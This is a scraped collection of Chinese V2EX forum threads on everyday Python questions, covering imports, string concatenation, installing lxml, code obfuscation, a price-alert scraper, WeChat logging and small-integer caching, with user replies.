{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从来没有尝试深入一点去了解 python 的 package 和 module ，今天稍微 google 了几篇文章看了下，做点记录，估计还是有很多错误的地方，还请指正。</p>\n<p>首先从 package 说起， package 意思就是包，那包里面就可以装点东西，比如再装一个小一点的包，或者放个手机。小一点的包的话就是 subpackage ，手机的话就是一个 module ，收音机也可以，就是收音机 module 。 package 是以 directory 的形式出现的，只要这个 directory <a href=\"http://%E9%87%8C%E9%9D%A2%E6%94%BE%E4%BA%86%E4%B8%80%E4%B8%AA__init__.py\" rel=\"nofollow\">里面放了一个__init__.py</a> ， python 就把这个 directory 当做一个 package 来处理，没有其他神奇的地方了。总结就是 package <a href=\"http://%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8C%85%E5%90%AB__init__.py\" rel=\"nofollow\">就是一个包含__init__.py</a> 的一个 directory 。</p>\n<p>再说 module ， module <a href=\"http://%E4%B8%80%E8%88%AC%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA.py\" rel=\"nofollow\">一般就是一个.py</a> 文件，比如 <a href=\"http://os.py\" rel=\"nofollow\">os.py</a> ，那就会是一个 os module 。简单，很好理解。</p>\n<p>再来看看 import 这个关键字，直观上，我们会见到这样几种 import ：</p>\n<p>import module</p>\n<p>import \"package\"</p>\n<p>from module import variable</p>\n<p>第一种： import module ，例子： import os ， import requests.sessions</p>\n<p>第二种： import \"package\"，我打上引号是因为这里的\"package\"其实是一个 module ，\n比如 import requests, requests 是一个 package 的名字对吧，但是 type(requests)返回的是 module ，这个 module 实际上是由 requests <a href=\"http://%E8%BF%99%E4%B8%AA%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84__init__.py\" rel=\"nofollow\">这个包里面的__init__.py</a> 生成的，也就是说 import requests 实际上的操作是 import requests.<strong>init</strong>.py as requests 。</p>\n<p>第三种： from module import variable ，这个没啥好说的，其实 import 的还是 module 。</p>\n<p>综上， import 其实都是在导入一个 module 。</p>\n<p>ps 前面所讲的 package <a href=\"http://%E6%98%AF%E5%8C%85%E5%90%AB__init__.py\" rel=\"nofollow\">是包含__init__.py</a> 的 directory 是一般情况，这种 package 被称作 regular package ，绝大部分 package 都是这样存在的。前面讲一个 module <a href=\"http://%E6%98%AF%E4%B8%80%E4%B8%AA.py\" rel=\"nofollow\">是一个.py</a> 文件也只是一般，是因为 import hook 的存在， module 可以以任意形式存在，所以网络远程加载模块对于 python 来说也是轻而易举。</p>\n<p>以上的讨论基于 python2 ， python3 对 package ， library ， import 的处理更加成熟和灵活。</p>\n</div></div>"], "reply": "4", "tittle": "浅谈 Python 的 package 和 module， import", "comment": ["谢谢", "了解到了，更清晰了，感谢", "谢谢分享", "确实清晰不少"]},
{"content": ["<div class=\"topic_content\">一个 url ： <a target=\"_blank\" href=\"http://www.xxx.xxx/search/user\" rel=\"nofollow\">http://www.xxx.xxx/search/user</a> + '/' +id ， id 为 int 型，结果报错，本来打算用 join 的，发现 join 函数也不允许连接一个 int 型\r<br>我主要写 PHP 的。换 py 写感觉好不适应</div>"], "reply": "75", "tittle": "py 的字符串拼接是不是有点反人类啊", "comment": ["str(id)", "url 是 str 型的，拼接要类型相同吧", "请用 str.format", "强类型的差别，感觉又要吵了。。。。", "\" ", "字符串拼接都是推荐\"\".format()来做的吧", "这个要看人类怎么定义", " \r", " \r", " \r", " \r", " \r", " \r", "感谢各位解答。。直接 str()了，写了几个月吐槽点越来越多。\r", "比如用 peewee 库， get 一个不存在的数据会报错，还非要 try 捕捉下， PHP 里就没有这么多蛋疼的地方\r", " ", "  希望随着时间的推移让我爱上 py 交易吧", "py 这也算蛋疼的话，那 C++之类只能哭晕在厕所了", "我曹, 还敢有 python 反人类的\r", "拉出去", " 这个不是 python 的锅吧\r", "peewee 我没用过，如果你用 django 的 ORM ， get 仍然会报错，但是用 first 就不会。\r", "这个取决于你的需求，如果这是一个意料之外的，比如不合法访问，那么报错保护了数据，直接结束整个流程，是完全正确的；反之如果处理不存在的情况也是一种业务上的需求，你可以 try ，也可以用 first 再去处理 first 的返回值。", "其实这个字符串拼接不自动转还是有好处的！\r", "\r", "——以前用 flv.js 视频时间显示不出来，慢慢找发现我给的数字其实是字符串型，它用+号加起来的时候全部变成了巨长的数字。", "各有各的蛋疼之处，主要看你习惯罢了  \r", "python 这样的语言你都觉得反人类，那我还有什么话说", " 如果 PHP 不报错，那空值直接进入下面的业务，产生无法控制的 bug ，这个才是真反人类", "如果 get 不报错，那你想获得什么结果呢", " #7 \r", " #14 \r", " #13 \r", " #12 \r", " #11 \r", " #10 \r", " #9\r", "\r", "  ", "   ", "  我知道错了，主要刚过来写没多久，保留了很多 PHP 的习惯，各位打住，避免引起不必要的战争", "没有模板字符串也就算了，字符串拼接居然不会自动转换类型。。。。", "用 c 语言的表示很淡定", "字符串拼接居然用 + 。\r", "不用 format 也可以 % 来拼接啊。\r", "另外 peewee get 不到的话，还有 get_object_or_404()  的方法。\r", "LZ 还是多看看文档吧", "就算报错，也会和你清清楚楚的说是类型错误啊。。", "简单拼接比较习惯 '", "' % id 这样写", "用 format()岂不是美滋滋", " #19  ", "   懒得用%,在 php 中简单的我一直是+来拼接\r", "\r", " #7 \r", " \r", " #20 \r", " #21 \r", " #18 \r", " #17 \r", " #15 \r", "\r", "感谢各位热心解答，想不到一个小小的话题这么多人回复，小弟受宠若惊啊。\r", "\r", "后来人打住吧，此贴作废。下班回家 ", " ", " #22 php 也有 format...我嫌麻烦，就这么简单的一个拼接。换的着上意大利炮吗 ", "  \r", "\r", "好了不多说了，各位散了", "推荐用 join ，性能比+高很多", "所以学编程从复杂的语言开始也有好处， c++用多了觉得其他语言怎么折腾也能接受，用 kotlin 踩了一段时间坑之后觉得太爽了", "用 perl 的时候,觉得类型随便用啊, 上下文自己感受,php 也是借鉴过来的", "大概是还不适应吧，平心而论 python 是写起来最符合审美的语言，说到反人类，怎么没有 java", "还好你用的不是 C.", "还好你不是用的静态类型的语言，要不然你可以去自杀了。", "   怎么说 java 了  类似 java 这种高级语言 更接近生活 怎么反人类了?  反人类的都是底层语言", "《 python 的 orm 是不是有点反人类啊》\r", "\r", "居然不能 \"select * from table where a=\" + 1", " \r", "1. 模板字符串 3.6 有了， f-string ，现在生产环境是 3.5 ， 3.6 并不遥远\r", "\r", "2. 字符串拼接自动转换类型？到时候又会来喷 1 + '1' = '11' 了", "这个 xxx.xxx 域名点开后很。。。。嗯。。。。。", " \r", "Python 本来就很反直觉啊", "Python 是强类型语言啊", "换语言不适应就是依然是以前语言的思维习惯问题而已，多用用就自然而然了。\r", "\r", "还记得用 c 换 py 的时候也有一两个月不适应。", "python 下的字符串拼接很好用啊\r", "url = '", "' %id", "用+是 js 党的习惯啊，哈哈哈", "同感", "看来是需要探讨一下“第一个语言是 c/c++的重要性”。", "` ", "  觉得 js 的最好用， '", "' %id 也还行", "确实，还不如 cpp ，隐式转换都没法做（逃\r", "\r", "不过格式化字符串用从一串模板字符串出发其实也算是标准做法", "果然 PHPer 的代码习惯够糟糕的哎...", "与 py 交易不如和 ruby\r", "\"http://www.xxx.xxx/search/user/#{id}\"", " 哦？+  是 JS 习惯？今天才知道... \r", "\r", "我当初直接 py 上手，开始用 + 好多年，最近两年才慢慢换成 ％类型 嵌入字符串里，末尾再加个 变量列表。", "lz 只会 php 吗", "这是强类型语言 不自动转型的  花式 format 很好用的 '", "你在 v2 吐槽 py 不是找不自在吗？😂😂😂", "你随便找本新手教程看一遍再用。。省时间", "动态类型一时爽……\r", "写 PHP 我感觉是没有 py 爽", " `%` 是淘汰的方法了，社区前阵子推荐 `str.format()`\r", "\r", "3.6 以后可以用这个\r", "\r", "```python\r", ">>> f'The value is {value}.'\r", "'The value is 80.'\r", "```", "习惯就好", "以 CPython 2.7.11 为例，在 Objects/stringobject.c 文件的 string_concat 函数开头加上：\r", "\r", " ```\r", "if(!PyString_Check(bb) && bb->ob_type->tp_str != NULL)\r", "{\r", "  PyObject *nbb = bb->ob_type->tp_str(bb);\r", "  return string_concat(a, nbb);\r", "}\r", "```\r", "然后就：\r", " ", "  \r", " ", " ", " 233333", "是 python2.x 还是 3.x ？\r", "我觉得 python 的已很人性化了。", "楼主一定是个假 php dev ， php 里 string concatenation 明明是 '.'", "可以试试写 node", "坐等 3.6", " 静态类型语言反而不觉得\r", "正因为 python 和 js 和 php 一样是弱类型的语言，所以想当然会觉得\r", "str + int 应该自动转换成 str + str ，还特地 str + str(int) 确实很蛋疼\r", "\r", "P.S. 用 python 三个礼拜有感", "楼主开了喷语言的贴，是说打住就能打住的吗？不翻页已经算好了。", "我觉得真正要吐槽的是运行到那一句才报错吧，要是 Python 静态类型多好", " Python 是强类型+动态类型", "重要的是在 python 下拼接字符串就不应该用 +\r", "不同语言要分开对待", "另外我记得 php 的拼接更奇葩吧，好像是用.", "如果真打算用一种新语言，应当找本书仔细看看，可以少很多坑，花不了几天时间。\r", "你的问题都是最基础的东西，看过书都知道。另外你是在有 PHP 的思维写 python ，自然不爽。\r", "第一个问题是因为类型不匹配。实际上 PHP 和 js 的自动类型转换很可能带来潜在的问题。\r", "第二个问题，你给个默认值就不会抛错。", " #60 Python 应该是强类型， js 是弱类型。\r", "\r", "弱类型语言是指变量的类型可以被隐式转换。而强类型语言趋向于不自动转换变量类型，转换类型需要手动进行。\r", "\r", "\r", "\r", " 其实少量拼接的时候+跟 join 的性能相差不大。", "#23 @", " 你一定是用了假的 PHP 。\r", "我写 PHP 的时候都是要用 . 来拼接的，你怎么会用 + 的？", "其实 lz 是来黑 php 用.连接字符的 (doge", " 写了这么多年 PHP 我到现在才知道 php 能用+连接字符串，但怎么感觉连完的结果不大对呢→_→", "那你用 Swift 岂不是要砸电脑，嘿嘿", "Python 和 php 是不同的编程语言啦，相信楼主很快就能适应。", "Python 反人类的又不只这一个，何必大惊小怪的。", "3.6 f-string:\r", "\r", "`f'http://www.xxx.xxx/search/user/{id}'`"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import os\nfrom multiprocessing import Process\n\ndef child_proc(name): \n    print \"Run child process %s (%s)...\" % (name, os.getpid())\n\nif __name__ == '__main__':\n    print \"Parent process %s.\" % (os.getpid())\n    p = Process(target=child_proc, args=('test',))\n    print 'Process will start.'\n    p.start()\n    p.join()\n    print 'Process end.'\n</code></pre>\n<pre><code>  File \"r.py\", line 5\n    print \"Run child process %s (%s)...\" % (name, os.getpid())\n                                       ^\nSyntaxError: invalid syntax\n</code></pre>\n<p>格式化有问题吗，看不出来啊</p>\n</div></div>"], "reply": "8", "tittle": "py 新人， print 死活不知道哪里错", "comment": ["Python 什么版本？", " py3", "......py3 里面 print 已经是一个函数了", "print()", " 懂了..", " 你也  在珠海啊", "请看 python3 入门教材第一页的 hello world 程序就知道了", "这是 2.7 的写法！"]},
{"content": ["<div class=\"topic_content\">背景： Python 爱好者，比较多的在 Windows 环境下用 Python ，偶尔用下 Linux ，习惯用 pip 做安装管理。\r<br>\r<br>昨晚搭虚拟环境安装库，在 Windows 上很顺利就安装完了，但在 Linux 上面总是各种报错，虽然面向搜索引擎编程将很多库都安装上了，但还剩下一个 lxml 库死活安装不上。\r<br>\r<br>常说： J （人） J （生）粗（苦）短，你用 Python 。\r<br>\r<br>问下 PY 老司机们，安装库有没有什么特殊姿势，可以尽量避免踩坑？</div>", "<div class=\"topic_content\">问题解决啦~~~\r<br>\r<br>错误信息是：\r<br>\r<br>collect2: error: ld returned 1 exit status\r<br>error: command 'i686-linux-gnu-gcc' failed with exit status 1\r<br>\r<br>\r<br>解决方案：\r<br>\r<br>sudo apt-get install zlib1g-dev\r<br>\r<br>sudo pip install lxml --upgrade\r<br>\r<br>sudo pip uninstall lxml\r<br>\r<br>sudo pip install lxml\r<br>\r<br>原理：我也不知道……应该是漏了 zlib1g-dev</div>"], "reply": "42", "tittle": "Python 安装库的姿势", "comment": ["anaconda", "去 Pypi 下载.whl 文件\r", "然后 pip install *.whl", "有些 Python 库是需要 c 库支持的，比如 lxml", "安装 python-dev 包 然后看报错信息 缺什么库就装什么 找个主流 linux 发行版 不会有问题", " 试过了， linux 版的都下载这样装过，都提示不支持系统平台……", " 用的是 Linux Mint 。 python-dev 包已经装了，报错提示缺的库也装了。", " lxml 的 C 库已经装了。", "如果是 Ubuntu ： apt-get install -y libxml2-dev python-dev build-essential\r", "然后 pip install 基本可以解决问题。\r", "- - - -\r", "\r", "根本原因是 libxml 用了 C 语言写的库，所以要装一个。你用多了就会发现， Linux 下面装 Python 的包远比 Windows 容易。基本上就是看看出错信息，了解一下哪些库系统还没装，然后 apt-get install 对应的包，然后就解决了。\r", "\r", "如果是 Windows ，你基本上只能期待有预先编译好的版本，如果没有，那就恭喜你了……\r", "- - - -\r", "\r", "此外你可以选择 Anaconda ，作为一个独立的 Python 发行版，它有巨大的预编译仓库。", "在 Ubuntu 里面 libxml2 和 libxml2-dev 是两个软件包。前者不带头文件和链接库。", "对的， anaconda 自带很多常用库，解决掉不少问题。", " 会不会没有装 dev 包， lxml-dev 之类的名字的包", "可以先装 wheel 然后下载.whl 文件安装 我的 lxml 就是这样装上的\r", "  附上网址", " \r", " \r", " 这个科学技术发行版好像不太适合吧。我是主要用来折腾 flask ，搞网站开发的。", " 这个方法我已经试过了，提示平台不支持……我明明下的就是 Linux 版的。", " 错误提示的 dev 包我都装了。不知道会不会是 wheel ， steup tool 版本的问题，换个版本提示信息会不一样，今晚回去再试试。", " 虽然 anaconda 主要是用来进行科学计算，但是很多其他包也都装了，并且自带的 conda 包管理工具虽然速度慢，但是能装上一些 pip 安装失败的包", ", 有清华源", "小白路过。。。", "win 上 lxml 跟 linux 上 lxml 包不一样，按理说 linux 上直接 pip 装就好了啊， win 上才要下单独编译好的才对。。。", "你倒是把报错信息贴出来让大家出出主意啊", "anaconda+1 傻瓜式装包", "```\r", "apt install (python-lxml | python3-lxml)\r", "```\r", "看样子没编译经验，别折腾了，缺少各种头文件罢了", " 电脑不在身边……", "把 pip 升级到最新版，之后直接安装就可以了， pip 8.0 之前不支持 wheels 。", "建议把系统 Python 和开发用的 Python 分开管理", "以前用 pyenv + anaconda \r", "\r", "现在用 yaourt 来管理版本 2 和 3", " 说了是“搭虚拟环境”，当然是分开的啊。\r", " 是最新版了。", "windows 老老实实 anaconda ，省心省力", "对于新人， 没有历史包袱的话， 我现在都推荐用 golang", " ……你不试试怎么知道不合适。\r", "\r", "不是 Anaconda 专用来科学计算，是科学计算的库大多用 C 写。科学计算的大多是研究院，折腾不来自己安装，所以 Anaconda 就是救星了。\r", "\r", "我发现程序员反而觉得自己很厉害，不肯用 Anaconda ，硬要折腾 pip 和各种自行编译。当然我原先也是带有这种歧视的，直到我真的用了 Anaconda ……", "昨天给树莓派 pip lxml 也出问题了。\r", "\r", "看这个 ", " Go 不太了解，听说 Go 做的程序复制粘贴就能到处跑，这一点确实是让人觉得不错的。\r", "\r", "看到一篇说 GO 语言的： ", " Go 语言是全静态编译 (而且可以交叉编译）， 基本可以做到你说的随拷随用，当然前提是架构相同（ IA64, X86, ARM 等）, 系统类别相同 （ Linux ， Windows, Mac ）。\r", "\r", "这篇文章之前看过，有两个问题： 一个是作者用既有经验去硬套 go ， 肯定会各种不爽， 我一开始也是这样的 ;D ， 但是换一个思路就不一样了； 第二是 Go 一直在快速发展， 文章里面提到的问题大多已不存在. 当然没有泛型还是让人不爽 233", "为什么我觉得 win 比较麻烦， linux 上面比较方便", " 不出错的时候，我也觉得 Linux 上面比较方便。 23333", "debian 下， apt-get 与 pip 配合使用，目前没遇到什么难装的库；\r", "楼主的问题，大概一条 apt-get intall python-lxml 就差不多解决了\r", "\r", "倒是 win 下没有包管理器，那些拿 C 语言写的包要么找第三方编译的，要么装 vs ，要么用 anaconda 这种的", " 我现在都不爱用 apt-get install python-xxxx 了，因为版本不能自由控制，经常装到旧版，程序 gg 。", "这种问题很好解决啊，把错误信息直接扔到 Google 里面，分分钟解决。一般这种问题在 Stackflow 上都有人问过的，所以很好解决。", "我在 ubuntu 16.04 下，先用 apt 安装 python-lxml ，若是 python 2.7 再用 pip 安装 lxml:\r", "\r", "apt install python-lxml      (自动安装在 python 3.5)\r", "pip install lxml                  (手动安装在 python 2.7)", "Anaconda 实在是太好用了，谁用谁知道。。。", " #36 這好像是 tautology （比如「理想氣體就是滿足理想氣體方程的氣體」）"]},
{"content": ["<div class=\"topic_content\">廖雪峰说 Python 代码不能加密，转换成 exe 加壳不算加密么？\r<br>如果不算，那怎么把转换的 exe 里的源码提取出来呢？</div>"], "reply": "22", "tittle": "Python 代码不能加密？", "comment": ["Python 不能直接编译成二进制文件，所谓的转换成 exe ，其实就是跟压缩软件打包一样，把代码打包在一起罢了。", "你用记事本打开看看，然后看一下其他语言编译的。", "自己翻一下书、 google 一下就能搞明白的事情", "pyc", "可以用 pyminifier 混淆代码\r", " ", "我们一个工具因为怕被解密改用 go 写了,感觉不错", " 那怎么解包呢？", " pyc 就看到几行无关紧要的代码", " 我小白不懂啊，打开 exe 是十六进制的", " 那取决于你的打包方式", " exe 文件是可以解压的  本质上也是压缩包", "可以。\r", "\r", "我专门研究过这个问题， python 代码加密甚至可以做到比用汇编手写混淆，用 c 手写混淆更加难以解密。具体做法略复杂仅简单说个过程。\r", "\r", "第一级别是源码级别的混淆，用 ast 和 astor ，再自己手写一个混淆器，三五百行的脚本直接混淆到几万行，整个文件面目全非，基本可以做到就算直接放脚本给你拿去逆，除非你再写出来一个逆向前面的混淆算法的脚本来逆（在熟悉 python 的情况下需要花几天，且不说需要了解程序构造原理），手动去调试脚本几乎达到不可行的地步（话费时间再乘以 2 ）\r", "\r", "第二级别是个性化定制 pyinstaller ， pyinstaller 会打包所有需要的库，将脚本也包含进打包的 exe ，但是， pyinstaller 有一个 stub ，相当于一个启动器，需要由这个启动器来解密脚本和导入模块，外面有直接导出脚本的工具，但是那是针对 pyinstaller 自带的启动器做的，完全可以自己修改这个启动器再编译，这样逆向者就必须手动调试找到 main 模块。配合第一级别加密，呵呵，中国就算是最顶尖的逆向专家也要花个一两周，来破解我们的程序逻辑了，就我所知，实际上国内对于 py 程序的逆向研究不多。\r", "\r", "第三级别是再上一层，将 py 翻译为 c 再直接编译 c 为 dll ，配合第一阶段先混淆再转 c 再编译，在第一步混淆之后，会产生非常多垃圾（中间层）函数，这些中间层函数在 c 这里会和 py 解释器互相调用，脚本和二进制之间交叉运行，本身混淆之后的源码就极难复原，再混合这一层，想逆向，难。\r", "\r", "第四级别是利用 py 的动态特性，绝大多数逆向者都是 c ，汇编出身，对于程序的第一直觉就是，程序就是一条一条的指令，后一条指令必然在这一条指令后面，然而， py 的动态特性可以让代码逻辑根本就不在程序里面，这一点不想多讲，涉及到我一个项目里的深度加密。\r", "\r", "第五级别，数学做墙。了解过比特币原理的知道要想用挖比特币就得提供大量算力去帮网络计算 hash ，这个成为 pow ，那么既然已经采用 py 了估计已经不考虑太多 cpu 利用率了，那就可以采用 pow （还有其他的手段）确保程序运行时拥有大量算力，如果程序被单步调试，呵呵，一秒钟你也跑不出来几个 hash 直接拉黑这个 ip （这个说法可能比较难理解，因为我第四层的加密没有说明，不过意思就是拒绝执行就对了）", "以上讨论基于 windows py2.7 ，不过基本具有通用性，其他平台和版本处理步奏一样。", "\r", "\r", "改 opcode 也是一个思路", "一般来说，混淆一下，然后 cython 编译，基本够用了。", " 请问 python 编译过后性能和未编译过是否有区别？当然是在都不好的基础上。", "   好复杂的样子， Google 的 Grumpy 可以把一般的 python 程序转译到 Go", " 计算密集型的过程，会加速，因为变成 c 代码编译了。你就当顺便提了个速。", "关键代码还是建议换语言写，然后调用。普通的程序无所谓了，你把 python 的空格搅乱我就不想看了……", "15 楼的方法亲测可行，而且成本比较低，写个脚本每次从源码生成 ELF 。不过代码里不能动态加路径到 sys.path ，记得 cython 好像不会处理这种情况，不知道是不是记错了。", "廖雪峰 for president", "以前在什么地方逛到过一个叫做 Nuitka （ ", " ）的东西，通过将 Python 代码编译成 C 程序，并通过调用 libpython 来实现，我没用过，但应该也可以起到一定混淆和加密的作用吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人大二狗，刚刚自学 Python ，因为看到某东的降价提醒很好用，而某宝却没有，因此想做一个降价提醒，用爬虫将他们的价格爬下来，然后做一个降价的提示，现在有几个问题：<br>\n1 、如果做好了这个脚本，如何让他一直保持运行；<br>\n2 、能不能实现邮箱通知或短信通知这个功能；<br>\n这些是我昨天晚上突发奇想，还没有去具体实现，如果后期遇到问题，还望 dalao 不吝赐教。</p>\n</div></div>"], "reply": "23", "tittle": "想用 Python 做一个淘宝的降价提醒。", "comment": ["如果只是盯着个别商品，都好说，用系统的计划任务隔一段时间来执行脚本，然后在分析价格，注册个网易邮箱来发通知邮件，或者弄个微信推送也行。如果要扫描整个淘宝的商品。额，那就复杂了，要弄代理池，防止 ip 被干掉，还要多线程去跑任务。建议从手机版网站去爬，这样信息量比较小", "1. 大概有两种思路， 可以考虑使用 flask ，一种是在 flask 里嵌入定时任务(做成网站的样子，好处是如果做上添加，可以变成网页添加，避免经常需要修改 Python 代码)，另一种是使用系统的定时任务(这时候 Python 脚本就只是个确定是否降价，如果降价就发邮件的程序)\r", "2. 使用 Flask-Mail ，短信的话只能花钱买 api 接口(当然也有免费的，我记得有个 api 是每天免费 5 条，应该做够）", " 说远了，楼主刚学 Python 的话，不建议就接触 web 框架，还是从一个脚本写起吧", "也许可以分析一下惠惠购物助手，直接用惠惠购物助手的信息", "一直保持运行 -> 可以换种方式, 每隔 delta 秒运行一次.\r", "\r", "像 crontab 这种定时任务管理, 或者 windows 自带的计划任务帮助你实现自动化执行的要求; \r", "\r", "然后爬虫提取 sku_id price timestamp 这些属性, 数据可以用 sqlite 或者 mysql 等熟悉的方式存储. 甚至本地的 tsv 文件都可以.\r", "\r", "提醒的话就邮件比较方便,  短信涉及到收费问题.\r", "发邮件工具 Python 的 SMTP 模块 (smtplib)  就能实现了.\r", "\r", "小菜鸟暂时也只能想到这些了, 供参考.", "写个简单的脚本，然后 crontab 就行了，我就是这么干的", "最大的问题是怎么反 反爬虫", "如果商品足够多    \r", "还没等爬虫爬下来东西已经被抢光了……", "如果只是单个商品，那就很简单了， Python 写个死循环，每隔一段时间执行一次就可以，消息发送可选方糖。如果是所有商品，那问题就好复杂了。", "只是想单纯的吐槽一下楼主的头像，另外楼上说的方糖是这个： ", "一点一点来，总之我保证这是一个大坑", " \r", " 同意\r", "笑而不语", "即刻 app 好像可以做到", "你提的这两个问题都不是大问题，坑的在其他地方。", "反扒是关键 其他无所谓", "chrome 市场里很多比价插件 惠惠等，还要造轮子的必要吗？", "第一个问题很简单，谷歌一下即可，第二个问题用 server 酱，也就是楼上提的方糖，微信提醒，用起来很方便", "淘宝上面不下几百亿的商品数据，你一个月能爬完一遍不？一个月的更新周期，降价提醒还有意义么？", "现在的电商网站都学尖了。\r", "\r", "不降价，但是有满减或者组合降价的活动。\r", "\r", "光监控价格没用。", "无解，淘宝的价格不是这么好抓取的，少数可用，多数恨麻烦", "你得盯鹊桥和隐藏优惠券", "部分商品监控还好。大量的，说句实话，这个还是甭想了，那不是你能做的。", "看你要监控的数量  大量的话   这个坑有点大。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不知道大家有没有过这样的经历：</p>\n<ul>\n<li>\n<p>电脑上跑着代码，人走开了，在外面特别挂念，想知道那代码跑得怎样了…</p>\n</li>\n<li>\n<p>写了个小程序，监控某个网页的变化，但没有比较实时的通知方式，邮件太重、短信又不好搞</p>\n</li>\n</ul>\n<p>在过去，这样的问题有时会困扰我。</p>\n<p><strong>不过现在，我可以把警告 /日志发到我的微信上。</strong></p>\n<pre><code>from wxpy import get_wechat_logger\n\n# 获得 Logger\nlogger = get_wechat_logger()\n\n# 发送警告\nlogger.warning('这是一条 WARNING 等级的日志！')\n\n# 捕获可能存在的异常，并发送\ntry:\n    1 / 0\nexcept:\n    logger.exception('又出错啦！')\n</code></pre>\n<p><strong>这样，不管我在哪，都可以第一时间收到程序的重要信息。</strong></p>\n<p><img alt=\"wxpy 发送日志\" src=\"https://ww2.sinaimg.cn/large/006tNbRwgy1fdmk5qpiz7j30dw0cmjt1.jpg\"></p>\n<h2>关于 wxpy</h2>\n<p>上面代码中所使用的 wxpy 模块，是我最近开发的个人微信号 API ，有微信就能用，无需申请公众号。</p>\n<p>除了上面的 logging 功能外，还集成了一些特色功能，比如：自动聊天(利用图灵机器人)、查看共同好友，统计好友或群的性别地区分布等等。</p>\n<p>当然，也覆盖了微信个人号的大部分基本功能。</p>\n<p>wxpy 在设计上注重“接口的使用体验”，并配有完善的文档。</p>\n<p>目前已开发 4 周，基本每天都有 commit 。</p>\n<h2>GitHub 主页</h2>\n<p><a href=\"https://github.com/youfou/wxpy\" rel=\"nofollow\">https://github.com/youfou/wxpy</a></p>\n<p>希望更多朋友加入进来，一起挖掘更多有意思的玩法！</p>\n</div></div>"], "reply": "33", "tittle": "新技能：在你的微信上监控 Python 程序", "comment": ["还不如弄个测试公众号，比这稳定多了", " 我弄了，用测试号推送我想要的东西，利用模版消息接口。最近用 go 重写，快完了。", "发给文件传输助手会有提醒么？", "\r", "推荐用这个……", "用方糖不就好了", "问题题外话，楼主你们都是怎么注册服务号的呢？自己注册工作室的？", "`全面优化接口，更有 Python 范儿`\r", "hhhhh 之前看 itchat 也有这想法", "sentry?", "我们是通过企业号实现的", " 都说了不用申请公众号", "看了下 Github ，楼主应该发过帖子了吧？我还加过群，只是碍于这种微信不能长期在线，所有还是用方糖和公众号测试号吧", " 我当然知道，我说的是自建服务", " pc 版利用文件助手发给自己", " 哈哈，一起来做吧", " 这个不错", "楼主，能否在没有 X 的情况下使用啊？因为在超算上跑的程序不会给 X 啊。。。。", " X 是什么，关闭按钮吗?", " X server", " 图形界面", " 抱歉，原谅我这个产品汪太无知… 没考虑这种情况呢", " 产品会写代码……挺厉害的……", " 可以另外使用 console_qr 参数初始化 Bot 对象，然后再传入到 get_wechat_logger() 中\r", "具体说明请看 ", "看了下 core 好像还是用的 itchat\r", "就是 itchat 套了一层。。。", "目前在用 ifttt 做重要信息推送，比较方便。", " 是的，重点在优化接口，内部大量套用，少量重写", "之前在 trending 上看见了,很厉害啊", "需要一直登录网页版？模拟的就是网页端？", "钉钉这么好用！", "还不如这样\r", "Good. Thanks.", "钉钉群组机器人,自定义 hook ", " 是的", "最讨厌的事就是收到监控日志了"]},
{"content": ["<div class=\"topic_content\">Python 3.5.2 (v3.5.2:4def2a2901a5, Jun 25 2016, 22:18:55) [MSC v.1900 64 bit (AM\r<br>D64)] on win32\r<br>Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r<br>&gt;&gt;&gt; 1==1.0\r<br>True\r<br>&gt;&gt;&gt; a=1\r<br>&gt;&gt;&gt; b=a\r<br>&gt;&gt;&gt; c=1\r<br>&gt;&gt;&gt; d=1.0\r<br>&gt;&gt;&gt;\r<br>\r<br>&gt;&gt;&gt; id(a)\r<br>1719534032\r<br>&gt;&gt;&gt; id(b)\r<br>1719534032\r<br>&gt;&gt;&gt; id(c)\r<br>1719534032\r<br>&gt;&gt;&gt; id(d)\r<br>1679888</div>"], "reply": "4", "tittle": "才发现 Python 的小整数的地址也是一样的，跟 Java 的-128-127 什么的是一个原理吗", "comment": [" 厉害厉害 我还没有直接看 cpython 源码的好习惯\r", "\r", "还有你这个直接让某行地址高亮的行为，是自己在 url 后面手写参数，还是说 github 上面网页可以点出来这个效果?", " shift+点击行数", "Python 有小整数池，提升性能用的。"]},
{"content": ["<div class=\"topic_content\">我抓包爬下了豆瓣 APP 的大部分接口\r<br>它每次调接口都会带上一个_sig,每次都不同， base64 形式的（ dR2D54z42HR7XjycZbzcJ3xD15k=），但解密后是乱码\r<br>不过测试了下这个值传不传都不影响结果\r<br>不知道是干嘛用的...</div>"], "reply": "3", "tittle": "豆瓣 APP 接口的 sig 大概是个什么东西？", "comment": ["接口调用签名吧", " 关键它只是个摆设，可以不传，一般签名怎么生成", "可能是防运营商缓存?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>网址是是<strong><a href=\"http://pituber.com\" rel=\"nofollow\">pituber.com</a></strong></h2>\n<p>社区只限于 webcrawler 及相关内容。<br>\n目前在校学生党一枚~对爬虫和数据挖掘感兴趣<br>\n希望能找到一些志同道合的人。</p>\n</div></div>"], "reply": "11", "tittle": "做了一个爬虫社区，欢迎入驻~", "comment": ["为什么你们都这么喜欢搞爬虫", "爬虫最近很火", " 妻不如妾，妾不如偷，偷不如偷不着", "火钳刘明", "搭车分享些爬虫技术笔记\r", "这个是自己写的，还是开源的？\r", "\r", "怎么和 react-china 一模一样。。。（ ", " 因为确实挺好玩啊～   以前找图片一个个复制粘贴～小说一页页翻～　现在几行代码全下来了～　　　很嗨皮", " 　　开源的，用 docker 部署的    喜欢这种风格的论坛，所以就采用了", " 请问这玩意叫啥？", " #9 ", "    ruby 写的 discourse~"]},
{"content": ["<div class=\"topic_content\">比如我现在有个构思，我想直接用类 UML 的方式画出来，然后工具自动生成代码。</div>"], "reply": "2", "tittle": "有没有好的 Python 工程设计并生成代码的工具？", "comment": ["\r", "\r", "\r", "付费软件", "我们单位在用赞同公司的一个企业级 python 代码生成器....\r", "\r", "那个生成器竟然是用 eclipse 改的。\r", "\r", "\r", "不知道花多少钱买的，反正肯定不便宜。"]},
